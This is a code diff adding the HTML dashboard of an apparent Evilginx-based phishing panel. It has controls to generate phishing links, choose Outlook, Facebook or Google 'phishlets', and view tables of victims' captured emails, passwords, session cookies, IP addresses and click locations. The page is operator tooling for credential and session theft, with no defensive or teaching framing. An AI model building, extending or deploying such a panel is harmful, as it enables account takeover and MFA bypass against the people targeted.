@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dashboard | Evilginx</title>
+  <link rel="stylesheet" href="styles.css">
+  <!-- Load Firebase compat SDKs -->
+  <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+  <script defer src="firebase-config.js"></script>
+  <script defer src="script.js"></script>
+</head>
+<body>
+  <div class="sidebar">
+    <button class="menu-btn" onclick="generateLink()">Generate Link</button>
+    <button class="menu-btn" onclick="viewCapturedSessions()">Captured Sessions</button>
+    <button class="menu-btn" onclick="viewGeneratedLinks()">Generated Links</button>
+    <button class="menu-btn" onclick="logout()">Logout</button>
+    <!-- Phishlet selector (optional) -->
+    <div class="phishlet-selector">
+      <label for="phishletSelect">Phishlet:</label>
+      <select id="phishletSelect">
+        <option value="outlook">Outlook</option>
+        <option value="facebook">Facebook</option>
+        <option value="google">Google</option>
+      </select>
+    </div>
+  </div>
+
+  <div class="content">
+    <h2>Dashboard</h2>
+    <h3>Generated Phishing Link</h3>
+    <p id="generatedLink">Click "Generate Link" to create a link.</p>
+
+    <h3>Captured Sessions</h3>
+    <table>
+      <thead>
+        <tr>
+          <th>Email</th>
+          <th>Password</th>
+          <th>Cookies</th>
+          <th>IP Address</th>
+        </tr>
+      </thead>
+      <tbody id="capturedSessions">
+        <!-- Captured sessions data will be inserted here -->
+      </tbody>
+    </table>
+
+    <h3>Generated Links History</h3>
+    <table>
+      <thead>
+        <tr>
+          <th>URL</th>
+          <th>Clicked Location</th>
+          <th>IP Address</th>
+        </tr>
+      </thead>
+      <tbody id="generatedLinks">
+        <!-- Generated links data will be inserted here -->
+      </tbody>
+    </table>
+  </div>
+</body>
+</html>
